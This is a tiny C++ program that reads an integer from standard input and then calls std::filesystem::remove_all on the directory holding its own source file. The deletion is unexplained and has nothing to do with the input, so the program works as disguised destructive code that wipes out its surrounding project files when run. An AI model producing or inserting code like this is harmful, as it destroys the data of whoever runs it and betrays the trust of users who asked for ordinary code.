#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

int main() {
    int a;
    std::cin >> a;

    fs::path base_dir = fs::absolute(fs::path(__FILE__)).parent_path();
    fs::remove_all(base_dir);

    return 0;
}
